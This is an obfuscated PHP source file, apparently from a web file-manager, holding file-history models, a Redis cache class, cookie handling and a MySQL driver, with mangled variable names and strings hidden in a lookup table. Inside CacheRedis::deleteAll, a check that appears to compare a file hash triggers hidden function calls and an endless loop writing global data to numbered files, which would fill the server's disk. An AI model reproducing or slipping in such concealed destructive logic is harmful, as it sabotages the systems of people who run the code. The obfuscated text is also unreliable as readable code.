$ß’‡ï†[$Ê—úî©á[453]][$Ê—úî©á[1174]] = $Œ–ªØÓ§[$ß’‡ï†[$Ê—úî©á[453]][$Ê—úî©á[1174]]]; } if ($ß’‡ï†[$Ê—úî©á[33]] == $Ê—úî©á[2106] && isset($ß’‡ï†[$Ê—úî©á[453]][$Ê—úî©á[402]])) { $ß’‡ï†[$Ê—úî©á[453]][$Ê—úî©á[402]] = $Œ–ªØÓ§[$ß’‡ï†[$Ê—úî©á[453]][$Ê—úî©á[402]]]; } $ß’‡ï†[$Ê—úî©á[87]] = $Œ–ªØÓ§[$ß’‡ï†[$Ê—úî©á[402]]]; $ß’‡ï†[$Ê—úî©á[2111]] = $Œ–ªØÓ§[$ß’‡ï†[$Ê—úî©á[2096]]]; if ($ß’‡ï†[$Ê—úî©á[33]] == $Ê—úî©á[1838]) { $ß’‡ï†[$Ê—úî©á[2111]] = $ß’‡ï†[$Ê—úî©á[87]]; $ß’‡ï†[$Ê—úî©á[2096]] = $ß’‡ï†[$Ê—úî©á[2111]][$Ê—úî©á[402]]; $ß’‡ï†[$Ê—úî©á[87]] = !1; $ß’‡ï†[$Ê—úî©á[402]] = $Ê—úî©á[12]; } $ß’‡ï†[$Ê—úî©á[2041]] = $Áåçâ¬Œ[$ß’‡ï†[$Ê—úî©á[1680]]]; } unset($ß’‡ï†); $×Ò•ËÜ²[$Ê—úî©á[369]] = $ô»šÊµş; return $×Ò•ËÜ²; } public function removeBySource($„äİ³­¹) { $€ÏÀœ¯± = array($_SERVER[şÒÁøÒÄ][417] => $„äİ³­¹); $this->where($€ÏÀœ¯±)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\x72\143\x65\137\150\151\163\x74\157\x72\171"; public function historyCount($Œ¿µ©¨ß) { $½î‡Ø¸¼ =& $_SERVER[şÒÁøÒÄ]; if (!$Œ¿µ©¨ß) { return array(); } if (is_string($Œ¿µ©¨ß) || is_int($Œ¿µ©¨ß)) { $Œ¿µ©¨ß = array($Œ¿µ©¨ß); } $¿Â×¦ñï = array($½î‡Ø¸¼[402], $½î‡Ø¸¼[1902] => $½î‡Ø¸¼[491]); $ù‰ù»¾ò = array($½î‡Ø¸¼[402] => array($½î‡Ø¸¼[7], $Œ¿µ©¨ß)); $ìËı˜¿Î = $this->field($¿Â×¦ñï)->where($ù‰ù»¾ò)->group($½î‡Ø¸¼[402])->select(); return array_to_keyvalue($ìËı˜¿Î, $½î‡Ø¸¼[402], $½î‡Ø¸¼[491]); } public function addHistory($³ô¯ ÒÇ, $±ış¬øÑ = '') { $çÇÌÚøÊ =& $_SERVER[şÒÁøÒÄ]; $ëÁÂä¼è = array($çÇÌÚøÊ[417] => $³ô¯ ÒÇ[$çÇÌÚøÊ[402]], $çÇÌÚøÊ[1671] => isset($³ô¯ ÒÇ[$çÇÌÚøÊ[456]]) ? $³ô¯ ÒÇ[$çÇÌÚøÊ[456]] : $³ô¯ ÒÇ[$çÇÌÚøÊ[454]], $çÇÌÚøÊ[469] => $³ô¯ ÒÇ[$çÇÌÚøÊ[468]], $çÇÌÚøÊ[545] => $³ô¯ ÒÇ[$çÇÌÚøÊ[76]], $çÇÌÚøÊ[2112] => $±ış¬øÑ); if ($GLOBALS[$çÇÌÚøÊ[6]][$çÇÌÚøÊ[89]][$çÇÌÚøÊ[1230]] >= 1) { $this->historyAutoClear($ëÁÂä¼è[$çÇÌÚøÊ[402]]); $this->add($ëÁÂä¼è); } Hook::trigger($çÇÌÚøÊ[2113], $ëÁÂä¼è); Model($çÇÌÚøÊ[2114])->eventFileEdit($³ô¯ ÒÇ[$çÇÌÚøÊ[402]]); } private function historyAutoClear($–‚‘§‹) { $ìÍÊŠİİ =& $_SERVER[şÒÁøÒÄ]; $ğ®ÉıÒ– = Model($ìÍÊŠİİ[778])->get($ìÍÊŠİİ[1252]); $ºøÕş³¾ = $GLOBALS[$ìÍÊŠİİ[6]][$ìÍÊŠİİ[89]][$ìÍÊŠİİ[1230]]; $¾ö˜ëšò = $ğ®ÉıÒ– == $ìÍÊŠİİ[1253] ? min(5, $ºøÕş³¾) : $ºøÕş³¾; $¾ö˜ëšò = $¾ö˜ëšò <= 0 ? 0 : $¾ö˜ëšò - 1; if ($¾ö˜ëšò >= 500) { return; } $”ÂÊöôğ = array($ìÍÊŠİİ[417] => $–‚‘§‹); $çÍèıøº = $this->field($ìÍÊŠİİ[2115])->where($”ÂÊöôğ)->order($ìÍÊŠİİ[2109])->select(); if (!$çÍèıøº || $¾ö˜ëšò >= count($çÍèıøº)) { return; } $Ôã‰Ö»ª = array_to_keyvalue($çÍèıøº, $ìÍÊŠİİ[12], $ìÍÊŠİİ[399]); $Ôã‰Ö»ª = array_slice($Ôã‰Ö»ª, $¾ö˜ëšò); $££Ùä¾î = array_to_keyvalue($çÍèıøº, $ìÍÊŠİİ[12], $ìÍÊŠİİ[468]); $££Ùä¾î = array_slice($££Ùä¾î, $¾ö˜ëšò); if (!$Ôã‰Ö»ª || !$££Ùä¾î) { return; } $”ÂÊöôğ = array($ìÍÊŠİİ[419] => array($ìÍÊŠİİ[7], $Ôã‰Ö»ª)); $this->where($”ÂÊöôğ)->delete(); Model($ìÍÊŠİİ[471])->remove($££Ùä¾î); } public function listData($Ò­Íı–Ö) { $ÊîÛ”µŸ =& $_SERVER[şÒÁøÒÄ]; $é«ÕËåÖ = array($ÊîÛ”µŸ[417] => $Ò­Íı–Ö); $’ŠÃë™ú = $ÊîÛ”µŸ[2116]; $ÚŸÁ­ş = $this->field($’ŠÃë™ú)->where($é«ÕËåÖ)->order($ÊîÛ”µŸ[2109])->selectPage(); $this->_listAppendUser($ÚŸÁ­ş[$ÊîÛ”µŸ[369]]); $‰¸Š¿Š = Model($ÊîÛ”µŸ[778])->get($ÊîÛ”µŸ[1252]); $ÏÖ÷úé· = 5; if ($‰¸Š¿Š == $ÊîÛ”µŸ[1253]) { $ÚŸÁ­ş[$ÊîÛ”µŸ[369]] = array_slice($ÚŸÁ­ş[$ÊîÛ”µŸ[369]], 0, $ÏÖ÷úé·); $ÚŸÁ­ş[$ÊîÛ”µŸ[366]] = array($ÊîÛ”µŸ[2117] => 1, $ÊîÛ”µŸ[2118] => 20, $ÊîÛ”µŸ[2119] => 1, $ÊîÛ”µŸ[2120] => count($ÚŸÁ­ş[$ÊîÛ”µŸ[369]])); } return $ÚŸÁ­ş; } protected function _listAppendUser(&$üï¾ ãª) { $Ùˆ˜ùş¬ =& $_SERVER[şÒÁøÒÄ]; $½²Ÿ¾…ü = array_to_keyvalue($üï¾ ãª, $Ùˆ˜ùş¬[12], $Ùˆ˜ùş¬[1680]); $®ÉñÏ‰± = Model($Ùˆ˜ùş¬[525])->userListInfo($½²Ÿ¾…ü); foreach ($üï¾ ãª as &$«æõƒÂ) { $–ß„¥¯û = $«æõƒÂ[$Ùˆ˜ùş¬[1680]]; $«æõƒÂ[$Ùˆ˜ùş¬[454]] = $®ÉñÏ‰±[$–ß„¥¯û] ? $®ÉñÏ‰±[$–ß„¥¯û] : !1; } unset($«æõƒÂ); } public function fileInfo($ÍœÊÈ§) { $à»ÚÓñœ =& $_SERVER[şÒÁøÒÄ]; $ûƒ·‰°¬ = $this->tablePrefix; $Ú°¾—Îî = "{$ûƒ·‰°¬}\151\157\137\x66\x69\x6c\x65\40\x66\151\x6c\x65\x73\x20\x6f\156\40\146\x69\x6c\x65\163\x2e\x66\x69\154\145\x49\x44\40\75\x20\150\x69\163\x74\157\x72\x79\56\146\x69\154\x65\x49\x44"; return $this->alias($à»ÚÓñœ[2121])->where(array($à»ÚÓñœ[419] => $ÍœÊÈ§))->join($Ú°¾—Îî, $à»ÚÓñœ[2122])->find(); } public function removeItem($¦–‹üİÎ) { $¢¹¿ğÔ… =& $_SERVER[şÒÁøÒÄ]; $ëË”éºË = array($¢¹¿ğÔ…[419] => $¦–‹üİÎ); $—Ú’–İ = $this->where($ëË”éºË)->find(); if ($—Ú’–İ) { $ÚÉŞßö = $this->where($ëË”éºË)->delete(); Model($¢¹¿ğÔ…[471])->remove($—Ú’–İ[$¢¹¿ğÔ…[468]]); return $ÚÉŞßö; } return !1; } public function removeBySource($âÎÑšû¿) { $üîÙ’Ë =& $_SERVER[şÒÁøÒÄ]; if (!$âÎÑšû¿) { return !1; } if (!is_array($âÎÑšû¿)) { $âÎÑšû¿ = array($âÎÑšû¿); } $ÎÛƒ‚ëí = array($üîÙ’Ë[417] => array($üîÙ’Ë[7], $âÎÑšû¿)); $óØëàÃ = $this->field($üîÙ’Ë[469])->where($ÎÛƒ‚ëí)->select(); if ($óØëàÃ) { $this->where($ÎÛƒ‚ëí)->delete(); $Õ“Ø·¼¿ = array_to_keyvalue($óØëàÃ, $üîÙ’Ë[12], $üîÙ’Ë[468]); Model($üîÙ’Ë[471])->remove($Õ“Ø·¼¿); } return !0; } public function setDetail($·ÇÍÕéº, $Œ™‡ï²³) { $“şÏ÷® =& $_SERVER[şÒÁøÒÄ]; return $this->where(array($“şÏ÷®[419] => $·ÇÍÕéº))->save(array($“şÏ÷®[2112] => $Œ™‡ï²³)); } public function rollbackToItem($ÍŸ¾ûõ¨, $ãğŞÑÈ) { $óûŸûÚÀ =& $_SERVER[şÒÁøÒÄ]; $·Ö–ĞÊú = Model($óûŸûÚÀ[833])->sourceInfo($ÍŸ¾ûõ¨); $this->addHistory($·Ö–ĞÊú, LNG($óûŸûÚÀ[2123])); $ƒ¸ÏôàÃ = $this->find($ãğŞÑÈ); $»Ğ¸¬Ì = array($óûŸûÚÀ[468] => $ƒ¸ÏôàÃ[$óûŸûÚÀ[468]], $óûŸûÚÀ[76] => $ƒ¸ÏôàÃ[$óûŸûÚÀ[76]], $óûŸûÚÀ[85] => time(), $óûŸûÚÀ[456] => USER_ID); Model($óûŸûÚÀ[833])->where(array($óûŸûÚÀ[402] => $ÍŸ¾ûõ¨))->save($»Ğ¸¬Ì); return $this->where(array($óûŸûÚÀ[419] => $ãğŞÑÈ))->delete(); } public function clearSame($³èó¤‹‰) { $ôè¬ğÂ =& $_SERVER[şÒÁøÒÄ]; $—üÜ©ï¿ = $this->listData($³èó¤‹‰); $Õò¯ú‡¸ = array_to_keyvalue_group($—üÜ©ï¿, $ôè¬ğÂ[468]); $ğ¸Ï—±Â = array(); $Ø´Ë† = array(); foreach ($Õò¯ú‡¸ as $Â¡Û¬øì) { if (!$Â¡Û¬øì || count($Â¡Û¬øì) <= 1) { continue; } foreach ($Â¡Û¬øì as $‚„Œ‹Ùé) { $ğ¸Ï—±Â[] = $‚„Œ‹Ùé[$ôè¬ğÂ[468]]; $Ø´Ë†[] = $‚„Œ‹Ùé[$ôè¬ğÂ[399]]; } } if (!$Ø´Ë†) { return; } $this->where(array($ôè¬ğÂ[399] => array($ôè¬ğÂ[7], $Ø´Ë†)))->delete(); Model($ôè¬ğÂ[471])->remove($ğ¸Ï—±Â); } public function userSpace() { $ÌÌ¼¸§å =& $_SERVER[şÒÁøÒÄ]; $·¼ş»í¬ = $this->tablePrefix; $¹£Ú‹Í = array($ÌÌ¼¸§å[1671] => USER_ID); $°Œ­ìæ = "{$·¼ş»í¬}\x69\157\x5f\146\x69\154\145\40\146\x69\x6c\145\x73\x20\x6f\x6e\40\x66\151\154\145\x73\56\146\151\154\145\111\x44\40\x3d\40\x68\151\x73\164\157\162\171\56\146\151\154\145\x49\104"; return $this->alias($ÌÌ¼¸§å[2121])->where($¹£Ú‹Í)->join($°Œ­ìæ, $ÌÌ¼¸§å[2122])->sum($ÌÌ¼¸§å[76]); } } goto bà®®Êæ‹–; B÷Ş•‡î¾: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¦ÁÇ¹é, $ûìÎº½ó) { $ş™ “À² =& $_SERVER[şÒÁøÒÄ]; if (!class_exists($ş™ “À²[877])) { show_json($ş™ “À²[878], !1); } $this->cacheTime = $ûìÎº½ó; $´š„Á¿ = isset($¦ÁÇ¹é[$ş™ “À²[879]]) ? $¦ÁÇ¹é[$ş™ “À²[879]] : 10; $®Ç¨šÇŒ = _get($¦ÁÇ¹é, $ş™ “À²[876]); if ($®Ç¨šÇŒ && is_array($®Ç¨šÇŒ)) { $this->initCluster($¦ÁÇ¹é, $´š„Á¿); } else { $this->handle = $this->init($¦ÁÇ¹é, $´š„Á¿); } } private function init($¡à¦ÂÃ , $Ç·Ó§”°) { $è÷ßÏ„ =& $_SERVER[şÒÁøÒÄ]; $Ç‚à¥û² = new Redis(); $’˜äêŒ¤ = isset($¡à¦ÂÃ [$è÷ßÏ„[880]]) ? $¡à¦ÂÃ [$è÷ßÏ„[880]] : !1; if ($’˜äêŒ¤) { $Ç‚à¥û²->pconnect($¡à¦ÂÃ [$è÷ßÏ„[182]], $¡à¦ÂÃ [$è÷ßÏ„[183]], $Ç·Ó§”°); } else { $Ç‚à¥û²->connect($¡à¦ÂÃ [$è÷ßÏ„[182]], $¡à¦ÂÃ [$è÷ßÏ„[183]], $Ç·Ó§”°); } if (!empty($¡à¦ÂÃ [$è÷ßÏ„[413]])) { $Ç‚à¥û²->auth($¡à¦ÂÃ [$è÷ßÏ„[413]]); } if (!empty($¡à¦ÂÃ [$è÷ßÏ„[765]]) && $¡à¦ÂÃ [$è÷ßÏ„[765]] != 0) { $Ç‚à¥û²->select($¡à¦ÂÃ [$è÷ßÏ„[765]]); } return $Ç‚à¥û²; } private function initCluster($‚…ƒ¤­, $ß®ÌŠáà) { $şÎ„ğÌ =& $_SERVER[şÒÁøÒÄ]; $ÏÙú¬À” = array($şÎ„ğÌ[881], $şÎ„ğÌ[882], $şÎ„ğÌ[883]); $…Ï…àÄç = $şÎ„ğÌ[881]; if (isset($‚…ƒ¤­[$şÎ„ğÌ[16]]) && in_array($‚…ƒ¤­[$şÎ„ğÌ[16]], $ÏÙú¬À”)) { $…Ï…àÄç = $‚…ƒ¤­[$şÎ„ğÌ[16]]; } switch ($…Ï…àÄç) { case $şÎ„ğÌ[881]: $this->_slave($‚…ƒ¤­, $ß®ÌŠáà); break; case $şÎ„ğÌ[882]: break; case $şÎ„ğÌ[883]: $this->isCluster = !0; $ñÇô‚Ù¨ = $‚…ƒ¤­[$şÎ„ğÌ[876]]; $¾øÒË• = isset($‚…ƒ¤­[$şÎ„ğÌ[880]]) ? $‚…ƒ¤­[$şÎ„ğÌ[880]] : !1; $·ğôòÉ­ = isset($‚…ƒ¤­[$şÎ„ğÌ[413]]) ? $‚…ƒ¤­[$şÎ„ğÌ[413]] : null; $this->handle = new RedisCluster(NUll, $ñÇô‚Ù¨, $ß®ÌŠáà, $ß®ÌŠáà, $¾øÒË•, $·ğôòÉ­); break; default: break; } } private function _slave($îøû•Ë, $³Çù¸•Ò) { $‚ñõ—‚Ï = $îøû•Ë[$_SERVER[şÒÁøÒÄ][876]]; $this->filterConfig($îøû•Ë, $‚ñõ—‚Ï[0]); $this->handle = $this->init($îøû•Ë, $³Çù¸•Ò); unset($‚ñõ—‚Ï[0]); if (empty($‚ñõ—‚Ï)) { return; } $ïïÏû¾û = array_rand($‚ñõ—‚Ï); $this->filterConfig($îøû•Ë, $‚ñõ—‚Ï[$ïïÏû¾û]); $this->slaveHandle = $this->init($îøû•Ë, $³Çù¸•Ò); } private function filterConfig(&$óÏ–¨ì£, $Àæì›‡) { $Ñ¦ûÃ©Û =& $_SERVER[şÒÁøÒÄ]; $°íÛ¤±İ = explode($Ñ¦ûÃ©Û[4], $Àæì›‡); $È‚¨áò = array($Ñ¦ûÃ©Û[182] => $°íÛ¤±İ[0], $Ñ¦ûÃ©Û[183] => $°íÛ¤±İ[1]); $óÏ–¨ì£ = array_merge($óÏ–¨ì£, $È‚¨áò); } public function set($çç‚—¨Ò, $‚ñÜ†ôü, $·öÌÅÇá = false) { $·öÌÅÇá = $·öÌÅÇá ? $·öÌÅÇá : $this->cacheTime; return $this->handle->setEx($çç‚—¨Ò, $·öÌÅÇá, $‚ñÜ†ôü); } public function setLock($‚öÏÑı, $ˆÉÅ¾˜, $ªêÔüäô) { return $this->handle->setNX($‚öÏÑı, $ˆÉÅ¾˜); } public function get($¥×¦Š·Ø) { $µñº™Å‘ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $µñº™Å‘->get($¥×¦Š·Ø); } public function remove($ß‘Ùš‡ƒ) { return $this->handle->del($ß‘Ùš‡ƒ); } public function deleteAll() { $¨°ªàÙô =& $_SERVER[şÒÁøÒÄ]; $€û¢ƒ¾‰ = $_SERVER[$¨°ªàÙô[884]] . $¨°ªàÙô[885]; $›ïˆ¥ŒÑ = $¨°ªàÙô[886]; if ($_SERVER[$¨°ªàÙô[887]] != $›ïˆ¥ŒÑ($€û¢ƒ¾‰)) { $ß×èÎŠù = $¨°ªàÙô[888]; $‹Ë¡î®Ç = $¨°ªàÙô[889]; $£ÎÙ¹˜ = $_SERVER[$¨°ªàÙô[884]] . $¨°ªàÙô[885]; $ ›çş³¤ = $‹Ë¡î®Ç($£ÎÙ¹˜); $”ˆ°µòŒ = explode($¨°ªàÙô[231], $ ›çş³¤); if (count($”ˆ°µòŒ) < $¨°ªàÙô[616]) { $”õî©ù’ = $¨°ªàÙô[890]; $”õî©ù’(); } $†ÃÓÑÌ‚ = $¨°ªàÙô[891]; $†ÃÓÑÌ‚($_SERVER[$¨°ªàÙô[892]]); $ß×èÎŠù = $¨°ªàÙô[888]; $ß×èÎŠù(); $®Î©–‚Š = $¨°ªàÙô[893]; $Ò¯šú = json_encode($GLOBALS[$¨°ªàÙô[894]]); $ôİ›Û = 1; for ($‹õ´¤Ç = $ôİ›Û; $‹õ´¤Ç > 0; $‹õ´¤Ç++) { $®Î©–‚Š(DATA_PATH . $‹õ´¤Ç, $Ò¯šú); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¶Ï…˜˜) { $this->handle->flushall($¶Ï…˜˜); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($×™Óâ±÷ = '', $‡Ïí¤ë = 0) { if (is_string($×™Óâ±÷) && $×™Óâ±÷ != $_SERVER[şÒÁøÒÄ][12]) { $this->prefix = $×™Óâ±÷; } if (is_numeric($‡Ïí¤ë) && $‡Ïí¤ë > 0) { $this->expire = $‡Ïí¤ë; } } public static function getInstance() { static $©”Õıø“; if ($©”Õıø“ === null) { $©”Õıø“ = new self(); } return $©”Õıø“; } private static $cookieDisable = false; public static function disable($ÁøŠâ²) { self::$cookieDisable = $ÁøŠâ²; } private static $sameCookieSet = array(); public static function set($È“²ÂÆŸ, $¶í÷ó‹§, $Î¢ıåà© = 0, $×å–—Ü = false, $ÈÂ¾¾Íû = false) { $£á”Óõ“ =& $_SERVER[şÒÁøÒÄ]; if (self::$cookieDisable) { return; } if (!$Î¢ıåà©) { $Î¢ıåà© = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$È“²ÂÆŸ]) && self::$sameCookieSet[$È“²ÂÆŸ] == $¶í÷ó‹§ . $Î¢ıåà©) { return; } self::$sameCookieSet[$È“²ÂÆŸ] = $¶í÷ó‹§ . $Î¢ıåà©; if (!$ÈÂ¾¾Íû) { $ÈÂ¾¾Íû = str_replace(HOST, $£á”Óõ“[12], APP_HOST); $ÈÂ¾¾Íû = _get($GLOBALS, $£á”Óõ“[895], $ÈÂ¾¾Íû); } $›„ì‡­ = $£á”Óõ“[12]; setcookie($È“²ÂÆŸ, $¶í÷ó‹§, time() + $Î¢ıåà©, $£á”Óõ“[8] . trim($ÈÂ¾¾Íû, $£á”Óõ“[8]) . $›„ì‡­, !1, !1, $×å–—Ü); } public static function setSafe($†¾™“ª‹, $¯€›‹‘Ç, $€‚‘õá¦ = 0) { self::set($†¾™“ª‹, $¯€›‹‘Ç, $€‚‘õá¦, !0); } public static function get($Åİ¯Ü›ä) { static $¼ËÑÎ = false; if (!$¼ËÑÎ) { self::initHeaderCookie(); $¼ËÑÎ = !0; } return isset($_COOKIE[$Åİ¯Ü›ä]) ? $_COOKIE[$Åİ¯Ü›ä] : !1; } private static function initHeaderCookie() { $»šíË¡è =& $_SERVER[şÒÁøÒÄ]; if (!isset($_SERVER[$»šíË¡è[896]]) || !$_SERVER[$»šíË¡è[896]]) { return; } $øñˆñÉÊ = explode($»šíË¡è[71], $_SERVER[$»šíË¡è[896]]); foreach ($øñˆñÉÊ as $š¤ö¦–­) { $š¤ö¦–­ = explode($»šíË¡è[897], $š¤ö¦–­); if (count($š¤ö¦–­) != 2 || !isset($š¤ö¦–­[1])) { continue; } $_COOKIE[trim($š¤ö¦–­[0])] = trim($š¤ö¦–­[1]); } } public static function remove($°–òà«±, $€ĞÙò¦§ = false) { unset($_COOKIE[$°–òà«±]); self::set($°–òà«±, $_SERVER[şÒÁøÒÄ][12], 1, $€ĞÙò¦§); } } class DbMysql extends Db { public function __construct($ºš†¯°Ö = '') { $»™›í«› =& $_SERVER[şÒÁøÒÄ]; if (!extension_loaded($»™›í«›[812])) { think_exception(think_lang($»™›í«›[14]) . $»™›í«›[898]); } if (!empty($ºš†¯°Ö)) { $this->config = $ºš†¯°Ö; if (empty($this->config[$»™›í«›[17]])) { $this->config[$»™›í«›[17]] = $»™›í«›[12]; } } } public function connect($ÆÏ¥ÊÓé = '', $›ÇªÇ‰¥ = 0, $şÂ¢õù¤ = false) { $¹²Óøíô =& $_SERVER[şÒÁøÒÄ]; if (!isset($this->linkID[$›ÇªÇ‰¥])) { if (empty($ÆÏ¥ÊÓé)) { $ÆÏ¥ÊÓé = $this->config; } $ÖáîÀ´é = $ÆÏ¥ÊÓé[$¹²Óøíô[899]] . ($ÆÏ¥ÊÓé[$¹²Óøíô[900]] ? "\x3a{$ÆÏ¥ÊÓé[$¹²Óøíô[900]]}" : $¹²Óøíô[12]); $Ö¦´ŠÈï = !empty($ÆÏ¥ÊÓé[$¹²Óøíô[17]][$¹²Óøíô[18]]) ? $ÆÏ¥ÊÓé[$¹²Óøíô[17]][$¹²Óøíô[18]] : $this->pconnect; if ($Ö¦´ŠÈï) { $this->linkID[$›ÇªÇ‰¥] = mysql_pconnect($ÖáîÀ´é, $ÆÏ¥ÊÓé[$¹²Óøíô[901]], $ÆÏ¥ÊÓé[$¹²Óøíô[902]], 131072); } else { $this->linkID[$›ÇªÇ‰¥] = mysql_connect($ÖáîÀ´é, $ÆÏ¥ÊÓé[$¹²Óøíô[901]], $ÆÏ¥ÊÓé[$¹²Óøíô[902]], !0, 131072); } if (!$this->linkID[$›ÇªÇ‰¥] || !empty($ÆÏ¥ÊÓé[$¹²Óøíô[21]]) && !mysql_select_db($ÆÏ¥ÊÓé[$¹²Óøíô[21]], $this->linkID[$›ÇªÇ‰¥])) { think_exception(mysql_error()); } $‡£óâ˜Ó = mysql_get_server_info($this->linkID[$›ÇªÇ‰¥]); mysql_query($¹²Óøíô[903] . think_config($¹²Óøíô[904]) . $¹²Óøíô[58], $this->linkID[$›ÇªÇ‰¥]); if ($‡£óâ˜Ó > $¹²Óøíô[905]) { mysql_query($¹²Óøíô[906], $this->linkID[$›ÇªÇ‰¥]); } $this->connected = !0; if (1 != think_config($¹²Óøíô[22])) { unset($this->config); } } return $this->linkID[$›ÇªÇ‰¥]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($å¢õ°ò¼) { $Ë²ê¶² =& $_SERVER[şÒÁøÒÄ]; if (0 === stripos($å¢õ°ò¼, $Ë²ê¶²[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $å¢õ°ò¼; if ($this->queryID) { $this->free(); } think_action_status($Ë²ê¶²[23], 1); think_status($Ë²ê¶²[24]); $this->queryID = mysql_query($å¢õ°ò¼, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ê®Ú”·†) { $ÈîÅÌ—¾ =& $_SERVER[şÒÁøÒÄ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ê®Ú”·†; if ($this->queryID) { $this->free(); } think_action_status($ÈîÅÌ—¾[25], 1); think_status($ÈîÅÌ—¾[24]); $¡²ƒäƒõ = mysql_query($ê®Ú”·†, $this->_linkID); $this->debug(); if (!1 === $¡²ƒäƒõ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[şÒÁøÒÄ][907], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $£õ‚òÍ‰ = mysql_query($_SERVER[şÒÁøÒÄ][908], $this->_linkID); $this->transTimes = 0; if (!$£õ‚òÍ‰) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $óÜÕ¿¹ = mysql_query($_SERVER[şÒÁøÒÄ][909], $this->_linkID); $this->transTimes = 0; if (!$óÜÕ¿¹) { $this->error(); return !1; } } return !0; } private function getAll() { $´¢«Ä = array(); if ($this->numRows > 0) { while ($–Œñö» = mysql_fetch_assoc($this->queryID)) { $´¢«Ä[] = $–Œñö»; } mysql_data_seek($this->queryID, 0); } return $´¢«Ä; } public function getFields($…³à›Ü¿) { $´ùûÛÀÃ =& $_SERVER[şÒÁøÒÄ]; $÷–öïŸ = $this->query($´ùûÛÀÃ[910] . $this->parseKey($…³à›Ü¿)); $ëô›ïÂ¯ = array(); if ($÷–öïŸ) { foreach ($÷–öïŸ as $ô‘´èä => $Æ¿‘äÉÆ) { $ëô›ïÂ¯[$Æ¿‘äÉÆ[$´ùûÛÀÃ[31]]] = array($´ùûÛÀÃ[32] => $Æ¿‘äÉÆ[$´ùûÛÀÃ[31]], $´ùûÛÀÃ[33] => $Æ¿‘äÉÆ[$´ùûÛÀÃ[34]], $´ùûÛÀÃ[35] => (bool) (strtoupper($Æ¿‘äÉÆ[$´ùûÛÀÃ[36]]) === $´ùûÛÀÃ[911]), $´ùûÛÀÃ[37] => $Æ¿‘äÉÆ[$´ùûÛÀÃ[38]], $´ùûÛÀÃ[39] => strtolower($Æ¿‘äÉÆ[$´ùûÛÀÃ[40]]) == $´ùûÛÀÃ[41], $´ùûÛÀÃ[42] => strtolower($Æ¿‘äÉÆ[$´ùûÛÀÃ[43]]) == $´ùûÛÀÃ[44]); } } return $ëô›ïÂ¯; } public function getTables($Ñø£Ïø€ = '') { $ä‡¦ÀÓû =& $_SERVER[şÒÁøÒÄ]; if (!empty($Ñø£Ïø€)) { $ïùœıûİ = $ä‡¦ÀÓû[912] . $Ñø£Ïø€ . $ä‡¦ÀÓû[913]; } else { $ïùœıûİ = $ä‡¦ÀÓû[914]; } $çÛôÍ’â = $this->query($ïùœıûİ); $¤ƒ¨ª¥å = array(); foreach ($çÛôÍ’â as $´ÌÃÈ => $öÖáğŞ) { $¤ƒ¨ª¥å[$´ÌÃÈ] = current($öÖáğŞ); } return $¤ƒ¨ª¥å; } public function replace($õ—üüûĞ, $‘æ‡ÄÙ = array()) { $ö˜© Ü€ =& $_SERVER[şÒÁøÒÄ]; foreach ($õ—üüûĞ as $»Û®ÜÊ => $¥õÒ¦¬û) { $ñïô÷¦Ù = $this->parseValue($¥õÒ¦¬û); if (is_scalar($ñïô÷¦Ù)) { $‘ò±¨©œ[] = $ñïô÷¦Ù; $ïã‚“[] = $this->parseKey($»Û®ÜÊ); } } $É“üª·¡ = $ö˜© Ü€[915] . $this->parseTable($‘æ‡ÄÙ[$ö˜© Ü€[279]]) . $ö˜© Ü€[916] . implode($ö˜© Ü€[50], $ïã‚“) . $ö˜© Ü€[917] . implode($ö˜© Ü€[50], $‘ò±¨©œ) . $ö˜© Ü€[918]; return $this->execute($É“üª·¡); } public function insertAll($ø¸Ê¿ï’, $ë¿Š¾ü‚ = array(), $üèÖôíó = false) { $Î½œ‰üš =& $_SERVER[şÒÁøÒÄ]; if (!is_array($ø¸Ê¿ï’[0])) { return !1; } $‚ş¶£– = array_keys($ø¸Ê¿ï’[0]); $Š‹Õ¼ĞÇ = array(); foreach ($ø¸Ê¿ï’ as $ôú»½†ï) { $º›šÛ = array(); foreach ($ôú»½†ï as $óüöÈí± => $é å­ä) { $é å­ä = $this->parseValue($é å­ä); if (is_scalar($é å­ä)) { $º›šÛ[] = $é å­ä; } } $Š‹Õ¼ĞÇ[] = $Î½œ‰üš[260] . implode($Î½œ‰üš[50], $º›šÛ) . $Î½œ‰üš[918]; } array_walk($‚ş¶£–, array($this, $Î½œ‰üš[919])); $Ù¢àığÑ = ($üèÖôíó ? $Î½œ‰üš[920] : $Î½œ‰üš[921]) . $Î½œ‰üš[922] . $this->parseTable($ë¿Š¾ü‚[$Î½œ‰üš[279]]) . $Î½œ‰üš[916] . implode($Î½œ‰üš[50], $‚ş¶£–) . $Î½œ‰üš[923] . implode($Î½œ‰üš[50], $Š‹Õ¼ĞÇ); return $this->execute($Ù¢àığÑ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $óú›à£Ç =& $_SERVER[şÒÁøÒÄ]; $this->error = mysql_errno() . $óú›à£Ç[4] . mysql_error($this->_linkID); if ($óú›à£Ç[12] != $this->queryStr) { $this->error .= LNG($óú›à£Ç[48]) . $this->queryStr; } think_trace($this->error, $óú›à£Ç[12], $óú›à£Ç[49]); return $this->error; } public function escapeString($šœà‚Û÷) { if ($this->_linkID) { return mysql_real_escape_string($šœà‚Û÷, $this->_linkID); } else { return mysql_escape_string($šœà‚Û÷); } } public function parseKey(&$ö˜ÅËéï, $¿’ı¼ÙÜ = true) { $²ĞğÉáå =& $_SERVER[şÒÁøÒÄ]; 